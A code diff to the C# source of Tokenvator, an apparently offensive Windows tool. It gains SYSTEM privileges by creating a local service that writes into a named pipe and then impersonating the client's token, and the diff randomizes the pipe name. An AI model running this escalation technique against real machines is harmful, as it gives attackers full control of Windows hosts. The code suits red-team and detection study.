@@ -28,6 +28,7 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        /// GetSystem function for when SeDebugPrivilege is not available
         ////////////////////////////////////////////////////////////////////////////////
         internal static void GetSystem()
         {
@@ -44,6 +45,7 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        /// GetSystem function for when SeDebugPrivilege is not available
         ////////////////////////////////////////////////////////////////////////////////
         internal static void GetSystem(string command, string arguments)
         {
@@ -59,16 +61,22 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        /// Internal GetSystem function where the magic happens
         ////////////////////////////////////////////////////////////////////////////////
         private static bool _GetSystem()
         {
-            Thread thread = new Thread(() => _GetPipeToken(@"\\.\pipe\Tokenvator"));
+            string pipename = PSExec.GenerateUuid(12);
+
+            Thread thread = new Thread(() => _GetPipeToken(BASE_DIRECTORY + pipename));
 
             using (PSExec psExec = new PSExec("Tokenvator"))
             {
                 if (!psExec.Connect("."))
+                {
+                    Console.WriteLine("[-] Unable to connect to local service host");
                     return false;
-                if (!psExec.Create("%COMSPEC% /c echo tokenvator > \\\\.\\pipe\\Tokenvator"))
+                }
+                if (!psExec.Create("%COMSPEC% /c echo tokenvator > " + BASE_DIRECTORY + pipename))
                     return false;
                 if (!psExec.Open())
                     return false;
@@ -154,7 +162,7 @@ namespace Tokenvator
                     128, 128, pipeSecurity
                 ))
                 {
-                    Console.WriteLine("[+] Created Pipe {0}", pipeName);
+                    Console.WriteLine("[+] Created Pipe {0}", BASE_DIRECTORY + pipeName);
                     namedPipe.WaitForConnection();
                     Console.WriteLine("[+] Connected to Pipe {0}", pipeName);
                     using (var streamReader = new StreamReader(namedPipe))
